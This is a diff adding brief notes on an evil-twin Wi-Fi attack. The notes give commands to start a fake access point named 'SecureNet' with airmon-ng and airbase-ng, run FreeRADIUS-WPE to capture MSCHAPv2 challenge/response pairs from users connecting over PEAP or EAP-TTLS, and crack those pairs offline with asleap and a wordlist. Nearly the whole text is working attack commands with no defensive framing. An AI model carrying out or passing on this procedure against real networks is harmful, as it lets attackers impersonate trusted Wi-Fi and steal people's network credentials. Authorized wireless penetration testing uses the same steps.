@@ -1,0 +1,15 @@
+Setting up the AP with FreeRadius-WPE
+    airmon-ng start wlan0
+    airbase-ng -e SecureNet -c [channel] mon0
+    /etc/init.d/freeradius-wpe start
+    tail -f /var/log/freeradius-wpe.log
+
+Cracking PEAP
+    # After capturing the MSCHAPv2 credentials using FreeRADIUS-WPE:
+    asleap -C [challenge] -R [response] -W /path/to/wordlist.txt
+
+Cracking EAP-TTLS
+    # Extract the tunneled MSCHAPv2 challenge/response from FreeRADIUS-WPE logs
+    asleap -C [challenge] -R [response] -W /path/to/wordlist.txt
+    
+    Note: The cracking process is identical to PEAP once the inner authentication is revealed.
